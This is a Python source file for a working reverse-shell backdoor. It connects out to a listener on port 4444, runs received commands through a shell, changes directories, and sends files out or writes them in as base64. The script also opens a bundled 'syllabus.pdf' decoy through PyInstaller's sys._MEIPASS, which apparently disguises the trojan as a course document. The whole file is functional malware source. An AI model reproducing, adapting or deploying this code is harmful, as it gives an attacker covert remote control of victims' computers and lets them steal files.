import socket
import subprocess
import json
import os
import base64
import sys


class Connector:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.host, self.port))
        print(f"Connected to {self.host}:{self.port}")
    

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send((json_data + "\n").encode())
        
    def reliable_receive(self):
        json_data = ""
        while "\n" not in json_data:
            json_data += self.connection.recv(1024).decode()
        return json.loads(json_data.rstrip("\n"))

    def execute_command(self, command):
            cmd = " ".join(command) if isinstance(command, list) else command
            result = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if result.returncode != 0:
                return result.stderr.strip() or "Command failed."
            return result.stdout
        

    def change_working_directory(self, path):
        os.chdir(path)
        return f"Changed working directory to {path}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return f"Uploaded file to {path}"


    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                
                elif command[0] == "upload" and len(command) > 1:
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_command(command)
            except Exception as e:
                command_result = f"Error: {e}"
            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\syllabus.pdf"
subprocess.Popen(file_name, shell=True)


try:
    my_connector = Connector("127.0.0.1", 4444)
    my_connector.run()
except Exception as e:
    sys.exit()